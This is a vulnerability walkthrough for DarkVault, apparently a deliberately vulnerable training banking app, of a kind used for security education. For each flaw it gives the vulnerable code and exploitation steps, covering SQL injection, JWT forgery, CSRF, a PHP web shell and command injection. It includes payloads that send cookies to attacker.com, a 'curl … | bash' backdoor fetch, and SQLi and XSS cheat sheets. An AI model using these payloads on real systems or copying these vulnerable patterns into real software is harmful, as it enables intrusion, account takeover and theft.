# DarkVault Vulnerabilities Documentation

This document provides detailed explanations of each vulnerability present in the DarkVault application, along with instructions on how to exploit them. This is intended for educational purposes only.

## Table of Contents
1. [Authentication Vulnerabilities](#authentication-vulnerabilities)
2. [Authorization Vulnerabilities](#authorization-vulnerabilities)
3. [Injection Vulnerabilities](#injection-vulnerabilities)
4. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
5. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
6. [Information Disclosure](#information-disclosure)
7. [Insecure File Upload](#insecure-file-upload)
8. [Command Injection](#command-injection)
9. [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
10. [Business Logic Flaws](#business-logic-flaws)
11. [Race Conditions](#race-conditions)
12. [Third-Party Library Vulnerabilities](#third-party-library-vulnerabilities)

---

## Authentication Vulnerabilities

### 1. SQL Injection in Login

**Description**: The login endpoint is vulnerable to SQL injection because it directly concatenates user input into the SQL query without parameterization.

**Location**: `/api/login` endpoint in `server.js`

**Vulnerable Code**:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**How to Exploit**:
1. Enter the following in the username field: `admin' --`
2. Enter anything in the password field (it will be ignored)
3. Submit the login form

**Explanation**:
- The `--` is a SQL comment that makes the query ignore the password check
- The resulting query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`

### 2. Plaintext Password Storage

**Description**: User passwords are stored in plaintext in the database without any hashing or encryption.

**Location**: User table in SQLite database

**How to Exploit**:
1. Obtain database access through any means (SQL injection, file access, etc.)
2. Query the users table: `SELECT username, password FROM users`
3. Directly read passwords without needing to crack hashes

### 3. JWT Token Issues

**Description**: The application uses JWT tokens with a weak secret key and stores sensitive role information in the token payload. The token is also stored insecurely in localStorage.

**Location**: JWT generation in `/api/login` endpoint and storage in frontend JavaScript

**Vulnerable Code**:
```javascript
// Backend
const token = jwt.sign(
  { id: user.id, username: user.username, role: user.role },
  'darkvault-super-secret-key',
  { expiresIn: '24h' }
);

// Frontend
localStorage.setItem('token', data.token);
```

**How to Exploit**:
1. Obtain a legitimate JWT token (by logging in or from localStorage)
2. Decode the token at https://jwt.io to view its contents
3. Modify the payload (e.g., change `role` to `admin`)
4. Re-sign the token with the known secret `darkvault-super-secret-key`
5. Replace your existing token with the modified one in localStorage

---

## Authorization Vulnerabilities

### 1. Debug Parameter Authentication Bypass

**Description**: The authentication middleware contains a backdoor that allows bypassing authentication using a debug parameter.

**Location**: `verifyToken` middleware in `server.js`

**Vulnerable Code**:
```javascript
if (!token) {
  // Vulnerable bypass - allows debug mode
  if (req.query.debug === 'true') {
    req.user = { id: 1, username: 'admin', role: 'admin' };
    return next();
  }
  return res.status(401).json({ message: 'No token provided' });
}
```

**How to Exploit**:
1. Append `?debug=true` to any protected URL
2. Example: `http://localhost:3000/api/users/1?debug=true`

### 2. Broken Access Control in Admin Endpoints

**Description**: The admin-only endpoint for exporting users relies on a query parameter for authorization rather than checking the user's role properly.

**Location**: `/api/admin/export-users` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// Broken access control - no proper role check
if (req.query.isAdmin === 'true') {
  db.all(`SELECT * FROM users`, (err, users) => {
    // ...
  });
} else {
  return res.status(403).json({ message: 'Unauthorized' });
}
```

**How to Exploit**:
1. Log in as any user (non-admin)
2. Access the admin endpoint with the parameter: `/api/admin/export-users?isAdmin=true`
3. Frontend implementation example:
   ```javascript
   // Add ?isAdmin=true to bypass the role check
   fetch(`${API_URL}/admin/export-users?isAdmin=true`, {
     headers: { 'Authorization': token }
   });
   ```

---

## Injection Vulnerabilities

### 1. SQL Injection in Search Function

**Description**: The search endpoint is vulnerable to SQL injection, allowing an attacker to execute arbitrary SQL commands.

**Location**: `/api/search` endpoint in `server.js`

**Vulnerable Code**:
```javascript
const query = `SELECT id, username, email FROM users WHERE username LIKE '%${term}%' OR email LIKE '%${term}%'`;
```

**How to Exploit**:
1. Log in to the application
2. Navigate to the search function
3. Enter a payload like: `' OR 1=1 --`
4. Submit the search form

**More Advanced Exploitation**:
1. Use UNION attacks to extract additional data:
   ```
   ' UNION SELECT sql, NULL, NULL FROM sqlite_master --
   ```
   This returns the schema definitions from the database

### 2. SQL Injection in Transaction History

**Description**: The transactions endpoint is vulnerable to SQL injection through the user_id parameter.

**Location**: `/api/transactions` endpoint in `server.js`

**Vulnerable Code**:
```javascript
const query = `
  SELECT * FROM transactions 
  WHERE sender_id = ${user_id} OR receiver_id = ${user_id}
  ORDER BY date DESC
`;
```

**How to Exploit**:
1. Intercept the request to `/api/transactions?user_id=2` using a proxy tool
2. Modify the user_id parameter to: `2 OR 1=1`
3. This will return all transactions in the database, not just those for user_id=2

---

## Cross-Site Scripting (XSS)

### 1. Reflected XSS via URL Parameter

**Description**: The application directly injects URL parameters into the DOM without sanitization.

**Location**: Message banner in `public/app.js`

**Vulnerable Code**:
```javascript
if (message) {
  messageBanner.style.display = 'block';
  // Vulnerable to XSS - directly injecting parameter into innerHTML
  messageBanner.innerHTML = message;
}
```

**How to Exploit**:
1. Craft a URL with a malicious script in the message parameter:
   ```
   http://localhost:3000/?message=<script>alert('XSS')</script>
   ```
2. Share this URL with a victim; when they visit it, the script will execute

### 2. Stored XSS in Transaction Notes

**Description**: Transaction notes are stored in the database and displayed without sanitization.

**Location**: Transaction creation in `/api/transfer` endpoint and display in transaction history

**Vulnerable Code**:
```javascript
// Server-side storage without sanitization
const transferQuery = `
  INSERT INTO transactions (sender_id, receiver_id, amount, date, note) 
  VALUES (${fromId}, ${to}, ${amount}, '${new Date().toISOString()}', '${note}')
`;

// Client-side rendering without sanitization
row.innerHTML = `
  <td>${tx.id}</td>
  <td>${tx.sender_id === currentUser.id ? 'Sent' : 'Received'}</td>
  <td>$${parseFloat(tx.amount).toFixed(2)}</td>
  <td>${tx.sender_id === currentUser.id ? 'To: ' + tx.receiver_id : 'From: ' + tx.sender_id}</td>
  <td>${new Date(tx.date).toLocaleString()}</td>
  <td>${tx.note}</td>
`;
```

**How to Exploit**:
1. Log in to the application
2. Make a transfer to another user
3. In the note field, enter: `<script>alert('XSS in Transaction')</script>`
4. When anyone views the transaction history containing this note, the script will execute

### 3. Stored XSS in Admin Messages

**Description**: Messages sent to admin are stored in the database and displayed without sanitization.

**Location**: Message submission in frontend and display in admin dashboard

**How to Exploit**:
1. Log in as a regular user
2. Navigate to the "Message Admin" feature
3. Enter a message with malicious script: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
4. When an admin views the messages, the script will execute with admin privileges

---

## Cross-Site Request Forgery (CSRF)

### 1. Missing CSRF Tokens

**Description**: The application doesn't implement CSRF tokens, making it vulnerable to cross-site request forgery attacks.

**Location**: All form submissions in the frontend

**How to Exploit**:
1. Create a malicious HTML page (example in `public/csrf-demo.html`):
   ```html
   <form id="csrf-form" action="http://localhost:3000/api/transfer" method="POST" target="csrf-frame" class="hidden">
     <input type="hidden" name="to" value="3"> <!-- Attack transfers to Bob (ID 3) -->
     <input type="hidden" name="amount" value="500"> <!-- Amount to steal -->
     <input type="hidden" name="note" value="Thanks for the Bitcoin!">
   </form>
   <script>
     document.getElementById('csrf-form').submit();
   </script>
   ```
2. Trick a victim (who is already authenticated to DarkVault) into visiting your page
3. The form will automatically submit, performing the transfer without the user's knowledge

### 2. Insecure Cookie Configuration

**Description**: Cookies are set without the `SameSite` attribute and with `httpOnly: false`.

**Location**: Cookie settings in `server.js`

**Vulnerable Code**:
```javascript
app.use(session({
  secret: 'session-secret-key',
  resave: true,
  saveUninitialized: true,
  cookie: {
    httpOnly: false,
    secure: false // Not using HTTPS
  }
}));
```

**How to Exploit**:
- The lack of SameSite restriction allows cookies to be sent in cross-origin requests
- Setting httpOnly: false allows JavaScript to access cookies

---

## Information Disclosure

### 1. Excessive Data Exposure in API Responses

**Description**: The user profile endpoint returns all user data, including sensitive information.

**Location**: `/api/users/:id` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// Returns all user data including sensitive information
return res.status(200).json(user);
```

**How to Exploit**:
1. Log in as any user
2. Make a request to `/api/users/1` (or any user ID)
3. The response will include all user data, including sensitive fields

### 2. Verbose Error Messages

**Description**: The application returns detailed error messages that may expose implementation details.

**Location**: Various error handlers in `server.js`

**Vulnerable Code**:
```javascript
if (err) {
  return res.status(500).json({ error: err.message });
}
```

**How to Exploit**:
1. Cause an error by providing invalid input
2. Examine the detailed error message in the response
3. Use the information disclosed to refine your attack

### 3. JWT Information Leakage

**Description**: JWT tokens contain sensitive role information and are accessible via JavaScript.

**How to Exploit**:
1. Log in to the application
2. Open the browser console and type: `localStorage.getItem('token')`
3. Decode the token at https://jwt.io to view sensitive user information

---

## Insecure File Upload

### 1. Unrestricted File Upload

**Description**: The file upload functionality doesn't validate file types or restrict dangerous file extensions.

**Location**: File upload configuration in `server.js`

**Vulnerable Code**:
```javascript
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    // No validation on filename - vulnerable to path traversal
    cb(null, file.originalname);
  }
});
const upload = multer({ storage: storage });
```

**How to Exploit**:
1. Log in to the application
2. Navigate to the file upload feature
3. Create a malicious PHP file (e.g., `shell.php`) containing:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Upload this file
5. Access the file at `/uploads/shell.php?cmd=ls` to execute commands

### 2. Path Traversal in File Upload

**Description**: The file upload doesn't sanitize filenames, allowing for path traversal attacks.

**How to Exploit**:
1. Create a file named `../config.js` (or other sensitive location)
2. Upload this file
3. The file will be saved outside the intended upload directory, potentially overwriting system files

---

## Command Injection

### 1. Command Injection in Admin Report

**Description**: The admin report feature executes system commands with unsanitized user input.

**Location**: `/api/admin/run-report` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// Vulnerable to command injection
exec(`node scripts/reports/${report_name}.js`, (error, stdout, stderr) => {
  // ...
});
```

**How to Exploit**:
1. Log in as an admin user
2. Navigate to the "Run Report" feature
3. Enter a payload like: `fake; cat /etc/passwd`
4. The command will execute, and the output will be returned

**Alternative payload for more dangerous exploits**:
- Windows: `fake.js & net user hacker password123 /add`
- Linux: `fake.js; curl -s http://attacker.com/backdoor | bash`

---

## Insecure Direct Object References (IDOR)

### 1. IDOR in User Profiles

**Description**: The user profile endpoint doesn't verify if the requesting user has permission to access the requested profile.

**Location**: `/api/users/:id` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// No authorization check - any authenticated user can access any profile
db.get(`SELECT * FROM users WHERE id = ${id}`, (err, user) => {
  // ...
});
```

**How to Exploit**:
1. Log in as any user
2. Change the user ID in the URL or API request to access another user's data
3. Example: If your ID is 2, request `/api/users/1` to access the admin's profile

### 2. IDOR in Admin Messages

**Description**: When sending a message to the admin, the user_id can be manipulated to impersonate another user.

**Location**: `/api/messages` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// No validation if the authenticated user owns the message
const query = `
  INSERT INTO admin_messages (user_id, message, date) 
  VALUES (${user_id}, '${message}', '${new Date().toISOString()}')
`;
```

**How to Exploit**:
1. Log in as any user
2. Intercept the request to `/api/messages` using a proxy tool
3. Change the `user_id` value to another user's ID (e.g., 1 for admin)
4. The message will appear to come from the spoofed user

---

## Business Logic Flaws

### 1. Negative Amount Transfer

**Description**: The transfer endpoint doesn't validate that the transfer amount is positive.

**Location**: `/api/transfer` endpoint in `server.js`

**Vulnerable Code**:
```javascript
// No validation that the amount is positive
const updateSenderQuery = `UPDATE users SET balance = balance - ${amount} WHERE id = ${fromId}`;
const updateReceiverQuery = `UPDATE users SET balance = balance + ${amount} WHERE id = ${to}`;
```

**How to Exploit**:
1. Log in to the application
2. Make a transfer with a negative amount (e.g., -100)
3. This will decrease the recipient's balance and increase your balance

### 2. No Balance Check in Transfer

**Description**: The transfer function doesn't validate if the sender has sufficient funds.

**Location**: `/api/transfer` endpoint in `server.js`

**How to Exploit**:
1. Log in with a user that has a small balance (e.g., $1000)
2. Make a transfer for an amount greater than your balance (e.g., $10000)
3. The transfer will succeed despite insufficient funds

---

## Race Conditions

### 1. Race Condition in Transfer Endpoint

**Description**: The transfer endpoint is vulnerable to race conditions because it doesn't use transactions or locks.

**Location**: `/api/transfer` endpoint in `server.js`

**Vulnerable Process**:
1. Check balance (implicitly through SQL)
2. Record transaction
3. Update sender balance
4. Update receiver balance

Each step is a separate database operation without proper synchronization.

**How to Exploit**:
1. Use the `race-condition-demo.js` script to execute multiple concurrent transfers
2. Example:
   ```bash
   node race-condition-demo.js
   ```
3. This sends multiple transfer requests simultaneously, potentially bypassing the implicit balance check

---

## Third-Party Library Vulnerabilities

### 1. Vulnerable Dependencies

**Description**: The application uses outdated versions of several libraries with known vulnerabilities.

**Location**: `package.json`

**Vulnerable Libraries**:
- `lodash: 4.17.15` - Prototype pollution vulnerability
- `serialize-javascript: 3.0.0` - Remote code execution vulnerability

**How to Exploit**:
1. Identify the vulnerable dependency version
2. Find a public exploit for that specific version
3. Execute the exploit in the context of the application

### 2. Insecure JWT Implementation

**Description**: The JWT library is used with a weak secret and without proper verification.

**Location**: JWT handling in `server.js`

**How to Exploit**:
1. Use the "none" algorithm attack by:
   - Decoding a valid JWT token
   - Changing the algorithm to "none"
   - Removing the signature
   - Using this token for authentication

---

## Additional Testing Resources

### Default Credentials

- Admin: username `admin`, password `admin123`
- User: username `alice`, password `password123`
- User: username `bob`, password `bobpassword`

### Testing Tools

For testing these vulnerabilities, the following tools can be helpful:

- **Burp Suite/ZAP**: For intercepting and modifying requests
- **SQLmap**: For automated SQL injection
- **JWT_Tool**: For testing JWT vulnerabilities
- **Browser Developer Tools**: For manipulating client-side JavaScript
- **Postman/Insomnia**: For crafting custom API requests

### SQLi Cheat Sheet

Common SQL injection payloads for SQLite:
```
' OR 1=1 --
' UNION SELECT 1,2,3 --
' UNION SELECT sql,NULL,NULL FROM sqlite_master --
' AND (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='a') --
```

### XSS Cheat Sheet

Common XSS payloads:
```
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="fetch('https://attacker.com?cookie='+document.cookie)">
``` 